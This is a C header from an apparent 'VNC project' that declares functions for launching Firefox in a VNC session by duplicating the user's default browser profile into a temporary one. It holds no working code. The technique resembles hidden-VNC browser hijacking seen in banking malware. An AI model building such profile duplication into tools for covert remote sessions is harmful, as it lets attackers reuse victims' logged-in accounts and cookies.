//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: ff.h
// $Revision: 186 $
// $Date: 2014-07-04 19:05:58 +0400 (Пт, 04 июл 2014) $
// description: 
//	FireFox launch in VNC session support
//	The idea is to duplicate default user profile and launch ff with temporary profile

#ifndef __FF_H_
#define __FF_H_

BOOL FF_CreateEvent(PVNC_SESSION pSession);
WINERROR FF_GetCommandLineW(PVNC_SESSION pSession, LPCWSTR szPath,LPWSTR *pNewCommandLine);
WINERROR FF_GetCommandLineA(PVNC_SESSION pSession, LPCSTR szPath,LPSTR *pNewCommandLine);

#endif